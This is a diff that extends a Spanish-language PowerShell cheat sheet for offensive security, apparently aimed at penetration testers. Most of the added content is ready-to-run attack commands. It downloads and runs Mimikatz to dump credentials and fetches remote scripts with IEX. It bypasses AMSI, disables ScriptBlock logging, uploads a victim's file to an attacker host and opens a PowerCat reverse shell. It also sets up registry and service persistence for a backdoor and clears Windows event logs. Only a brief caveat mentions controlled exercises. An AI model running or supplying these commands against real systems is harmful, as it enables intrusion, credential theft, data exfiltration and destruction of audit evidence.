@@ -96,3 +96,129 @@ IEX (New-Object Net.WebClient).DownloadString("http://<IP>/script.ps1")
 
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
+AVANZADO
+
+🔐 Credenciales en memoria
+
+```powershell
+# Dump de credenciales con Mimikatz (si ya tienes permisos)
+Invoke-Expression -Command "& {Invoke-WebRequest -Uri 'http://<IP>/mimikatz.exe' -OutFile 'C:\Windows\Temp\mimikatz.exe'; Start-Process 'C:\Windows\Temp\mimikatz.exe'}"
+```
+💡 Alternativamente, puedes ejecutar Mimikatz directamente en PowerShell usando Invoke-Mimikatz de PowerSploit si lo cargas manualmente.
+
+🧠 Enumerar software instalado
+```powershell
+Get-WmiObject -Class Win32_Product | Select-Object Name, Version
+```
+
+🧰 Enumerar programas en ejecución
+```powershell
+gps | where {$_.Path -like "*Program Files*"} | select Name, Path
+```
+
+📄 Archivos recientes abiertos por usuarios
+```powershell
+Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent" -Recurse
+```
+
+🧾 Ver historial de PowerShell
+```powershell
+Get-Content (Get-PSReadlineOption).HistorySavePath
+```
+
+🕳️ POST-EXPLOTACIÓN / PRIVILEGE ESCALATION
+
+
+🔒 Buscar archivos con permisos inseguros
+
+```powershell
+icacls "C:\Program Files" | findstr "(F)"  # Busca archivos con permisos Full para Everyone o Users
+```
+
+🧬 Información de drivers y controladores
+```powershell
+Get-WmiObject Win32_SystemDriver | Where-Object { $_.State -eq "Running" } | Select Name, PathName
+```
+
+🔌 Enumerar DLL hijacking targets
+
+```powershell
+Get-ChildItem -Path "C:\Program Files\", "C:\Program Files (x86)\" -Recurse -Include *.exe -ErrorAction SilentlyContinue |
+ForEach-Object {
+    $dllPath = Join-Path $_.DirectoryName "example.dll"
+    if (-Not (Test-Path $dllPath)) {
+        Write-Output "$dllPath podría ser vulnerable"
+    }
+}
+```
+
+🧱 BYPASS DE SEGURIDAD AVANZADO
+
+
+🔓 Desactivar el AMSI (variante mejorada)
+
+```powershell
+$Amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$Field = $Amsi.GetField('amsiInitFailed','NonPublic,Static')
+$Field.SetValue($null,$true)
+```
+
+🔍 Desactivar ScriptBlock Logging
+
+```powershell
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
+```
+
+📤 EXFILTRACIÓN Y COMUNICACIÓN
+
+🔄 Exfiltrar archivos a servidor remoto
+
+```powershell
+Invoke-WebRequest -Uri "http://<IP>/upload" -Method POST -InFile "C:\Users\victim\Desktop\important.docx"
+```
+
+🛰️ Reversar Shell con PowerShell (PowerCat)
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+powercat -c <IP> -p 4444 -e cmd
+```
+
+🕵️‍♂️ PERSISTENCIA AVANZADA
+
+
+🧠 Añadir key en el registro para persistencia
+
+```powershell
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\malicious\reverse.exe"
+```
+
+🧱 Crear servicio persistente
+
+```powershell
+New-Service -Name "UpdateService" -BinaryPathName "C:\malicious\backdoor.exe" -StartupType Automatic
+Start-Service -Name "UpdateService"
+```
+
+🧽 LIMPIEZA Y EVIDENCIAS
+
+🧹 Borrar logs de eventos
+
+```powershell
+wevtutil cl Security
+wevtutil cl System
+wevtutil cl Application
+```
+
+⚠️ Solo para cuando ya no se requiere mantener presencia, o como parte de un ejercicio controlado.
+
+📚 FUENTES Y HERRAMIENTAS RECOMENDADAS
+PowerSploit
+
+PowerView: https://github.com/PowerShellMafia/PowerSploit 
+
+Nishang: https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
+
+PowerCat: https://github.com/besimorhino/powercat
+
+Empire (PS Agent): https://github.com/BC-SECURITY/Empire
